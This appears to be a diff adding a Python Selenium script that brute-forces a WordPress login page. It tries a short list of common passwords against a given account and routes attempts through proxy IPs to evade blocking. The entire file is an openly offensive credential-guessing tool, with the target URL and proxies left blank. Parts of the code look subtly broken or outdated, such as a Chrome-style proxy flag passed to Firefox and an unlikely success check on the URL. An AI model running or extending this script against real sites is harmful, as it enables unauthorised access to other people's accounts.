@@ -1,0 +1,78 @@
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import random
+import time
+
+# List of predefined IP addresses
+ip_addresses = [
+    " ",  # Use your laptop's public IP address or other proxies
+]
+
+# List of passwords to try
+passwords = [
+    "password123",
+    "letmein",
+    "securepass",
+    "123456",
+    "qwerty",
+]
+
+password_found = None  # Initialize password_found
+
+# Function to perform login attempts with different passwords
+def perform_login(driver, email, used_passwords):
+    driver.get("")
+    
+    for _ in range(5):  # Try 5 passwords for each IP address
+        email_field = driver.find_element_by_id("user_login")  # Re-locate the email field
+        login_button = driver.find_element_by_id("wp-submit")
+
+        email_field.send_keys(email)
+
+        password_field = driver.find_element_by_id("user_pass")
+        password = random.choice([p for p in passwords if p not in used_passwords])
+        used_passwords.add(password)
+
+        password_field.clear()
+        password_field.send_keys(password)
+
+        login_button.click()
+        time.sleep(2)
+
+        # Handle any alert if present
+        try:
+            alert = driver.switch_to.alert
+            alert.accept()
+        except:
+            pass
+
+        # Check if login is successful
+        if "admin-dashboard" in driver.current_url:
+            global password_found
+            password_found = password
+            return True
+
+        # Navigate back to login page
+        driver.get("")
+    
+    return False
+
+if __name__ == "__main__":
+    email_to_use = "your@gmail.com"  # Replace with the Gmail address you want to use
+    used_passwords = set()
+
+    for ip in ip_addresses:
+        options = webdriver.FirefoxOptions()
+        options.add_argument(f'--proxy-server=http://{ip}')
+        
+        # Create a Firefox WebDriver using GeckoDriver
+        driver = webdriver.Firefox(executable_path="/usr/local/bin/geckodriver", options=options)
+        
+        success = perform_login(driver, email_to_use, used_passwords)
+        driver.quit()
+
+        if success:
+            print("Password found:", password_found)
+            break
+    else:
+        print("Run out of passwords in the word list")
